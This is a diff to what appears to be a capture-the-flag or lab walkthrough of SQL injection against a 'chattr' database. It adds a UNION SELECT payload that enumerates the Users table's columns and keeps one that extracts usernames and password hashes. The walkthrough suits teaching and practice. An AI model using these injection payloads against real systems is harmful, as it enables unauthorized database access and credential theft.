@@ -82,12 +82,17 @@ Now lets enumerate the databases and tables, we can do that with:
   - Table: Users
   - Database: chattr 
 
-...
+
+The next step is to get the column names for the "Users" table:
+
+    ') UNION SELECT 1,2,COLUMN_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="Users"# - 
 
 
-We can get the password hashes with:
+Lets inspect the "Username" and "Password"
 
     ') UNION SELECT 1,2,Username,Password FROM chattr.Users-- -
+
+- This gives us the password hashes!
 
 
 Next, lets see what permissions are avalible with the payload:
